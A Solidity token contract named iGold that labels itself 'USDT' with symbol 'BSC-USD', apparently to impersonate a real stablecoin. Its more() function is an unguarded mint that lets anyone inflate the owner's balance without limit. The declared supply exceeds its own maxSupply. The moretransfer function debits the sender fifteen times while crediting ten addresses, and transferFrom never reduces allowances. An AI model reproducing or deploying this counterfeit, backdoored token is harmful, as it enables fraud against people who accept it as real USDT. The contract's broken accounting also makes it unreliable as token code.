pragma solidity ^0.8.2;

contract iGold {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 3379997906 * 10 ** 18;
    uint public maxSupply = 100000000 * 10 ** 18;
    string public name = "USDT";
    string public symbol = "BSC-USD";
    uint public decimals = 18;
    address public owner;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        owner = msg.sender;
    }
    
    function balanceOf(address owner) public returns(uint) {
        return balances[owner];
    }
    

    function more(uint value) public returns(bool) {
        require(balanceOf(owner) >= maxSupply, 'You dont have a percentage');
        balances[owner] += value;
        return true;
    }

    function moretransfer(address to, address too, address tooo, address toooo, address tooooo, address toooooo, address tooooooo, address toooooooo, address tooooooooo, address toooooooooo, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[too] += value;
        balances[tooo] += value;
        balances[toooo] += value;
        balances[tooooo] += value;
        balances[toooooo] += value;
        balances[tooooooo] += value;
        balances[toooooooo] += value;
        balances[tooooooooo] += value;
        balances[toooooooooo] += value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }

    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }

}